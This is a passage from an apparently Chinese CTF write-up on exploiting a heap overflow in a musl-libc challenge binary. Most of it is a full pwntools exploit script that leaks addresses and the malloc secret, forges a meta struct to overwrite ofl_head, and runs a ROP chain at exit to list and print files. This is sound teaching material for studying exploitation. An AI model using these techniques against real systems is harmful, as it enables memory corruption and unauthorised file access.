+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(idx, size, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt;&#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx?&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;size?&#34;</span>, <span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Contnet?&#34;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt;&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx?&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt;&#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx?&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 1</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>2</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>3</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 3</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>4</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>5</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>6</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 6</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>7</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 7</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>8</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 8</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>9</span>, <span style=color:#40a070>0x2000</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 9</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>10</span>, <span style=color:#40a070>0x2000</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 10</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>30</span> <span style=color:#666>-</span> <span style=color:#40a070>10</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>15</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>heap_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) 
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> heap_addr <span style=color:#666>-</span> <span style=color:#40a070>0x298D50</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>__malloc_context_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_context&#34;</span>]
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;__malloc_context_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(__malloc_context_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>2</span>, <span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> p64(__malloc_context_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Content: &#34;</span>)
+</span></span><span style=display:flex><span>secret <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;secret: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(secret))
+</span></span></code></pre></div><p>这样就可以 leak 出来了。这里要注意的是一般情况下 musl 中被释放的 chunk 不能被立刻申请回来，所以这里先填满了一个 group 再进行释放，就可以申请回来了。</p><p>既然有溢出，就可以考虑伪造 meta 结构体进行 dequeue 进行任意地址写。任意地址写后似乎有很多种方法，我使用了比较简单的 fsop，即写 <code>ofl_head</code> 指针，这个东西和 glibc 中的 <code>_IO_list_all</code> 比较像，在 <code>exit</code> 中会调用 <code>__stdio_exit</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>__stdio_exit</span>(<span style=color:#902000>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	FILE <span style=color:#666>*</span>f;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>for</span> (f<span style=color:#666>=*</span>__ofl_lock(); f; f<span style=color:#666>=</span>f<span style=color:#666>-&gt;</span>next) close_file(f);
+</span></span><span style=display:flex><span>	close_file(__stdin_used);
+</span></span><span style=display:flex><span>	close_file(__stdout_used);
+</span></span><span style=display:flex><span>	close_file(__stderr_used);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里会遍历链表上的所有文件结构体，并执行 <code>close_file</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>close_file</span>(FILE <span style=color:#666>*</span>f)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>f) <span style=color:#007020;font-weight:700>return</span>;
+</span></span><span style=display:flex><span>	FFINALLOCK(f);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (f<span style=color:#666>-&gt;</span>wpos <span style=color:#666>!=</span> f<span style=color:#666>-&gt;</span>wbase) f<span style=color:#666>-&gt;</span>write(f, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (f<span style=color:#666>-&gt;</span>rpos <span style=color:#666>!=</span> f<span style=color:#666>-&gt;</span>rend) f<span style=color:#666>-&gt;</span>seek(f, f<span style=color:#666>-&gt;</span>rpos<span style=color:#666>-</span>f<span style=color:#666>-&gt;</span>rend, SEEK_CUR);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>劫持掉 write 或者 seek 指针后 rop 即可。</p><p>最后的 exp</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process([&#34;./libc.so&#34;, &#34;./r&#34;])</span>
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so&#34;</span>)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;123.60.25.24&#34;</span>, <span style=color:#40a070>12345</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(idx, size, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt;&#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx?&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;size?&#34;</span>, <span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Contnet?&#34;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt;&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx?&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt;&#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx?&#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 1</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>2</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>3</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 3</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>4</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>5</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>6</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 6</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>7</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 7</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>8</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;0&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 8</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>9</span>, <span style=color:#40a070>0x2000</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 9</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>10</span>, <span style=color:#40a070>0x2000</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 10</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>30</span> <span style=color:#666>-</span> <span style=color:#40a070>10</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>15</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>heap_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) 
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> heap_addr <span style=color:#666>-</span> <span style=color:#40a070>0x298D50</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>__malloc_context_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_context&#34;</span>]
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;__malloc_context_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(__malloc_context_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>2</span>, <span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> p64(__malloc_context_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Content: &#34;</span>)
+</span></span><span style=display:flex><span>secret <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;secret: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(secret))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sc <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>freeable <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>last_idx <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>maplen <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>ofl_head_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x297E68</span> 
+</span></span><span style=display:flex><span>fake_mem_addr <span style=color:#666>=</span> heap_addr <span style=color:#666>+</span> <span style=color:#40a070>0xF0</span> <span style=color:#666>-</span> <span style=color:#40a070>0x50</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x598</span>
+</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x000000000001b8fd</span>
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000014b82</span>
+</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000009328</span>
+</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x000000000001b27a</span>
+</span></span><span style=display:flex><span>syscall <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000001d14</span>
+</span></span><span style=display:flex><span>syscall_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000023711</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x300</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(fake_mem_addr <span style=color:#666>+</span> <span style=color:#40a070>0x100</span> <span style=color:#666>-</span> <span style=color:#40a070>0x40</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;open&#34;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(fake_mem_addr <span style=color:#666>-</span> <span style=color:#40a070>0x1000</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x1000</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rax_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(<span style=color:#40a070>217</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(syscall_ret)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 以下用来读出 flag</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#rop_chain += p64(pop_rdi_ret)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#rop_chain += p64(3)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#rop_chain += p64(pop_rsi_ret)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#rop_chain += p64(fake_mem_addr - 0x1000)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#rop_chain += p64(pop_rdx_ret)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#rop_chain += p64(0x1000)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#rop_chain += p64(libc_base + libc.sym[&#34;read&#34;])</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(fake_mem_addr <span style=color:#666>-</span> <span style=color:#40a070>0x1000</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x1000</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;write&#34;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> rop_chain
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust((<span style=color:#40a070>0x1000</span> <span style=color:#666>-</span> <span style=color:#40a070>0x30</span>), <span style=color:#4070a0>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(secret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># fake_meta</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(ofl_head_addr <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>) <span style=color:#60a0b0;font-style:italic># prev</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(fake_mem_addr) <span style=color:#60a0b0;font-style:italic># next</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(fake_mem_addr) <span style=color:#60a0b0;font-style:italic># mem</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># avail_mask, freed_mask</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64((maplen <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>) <span style=color:#666>|</span> (sc <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>6</span>) <span style=color:#666>|</span> (freeable <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>5</span>) <span style=color:#666>|</span> last_idx)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>9</span>)
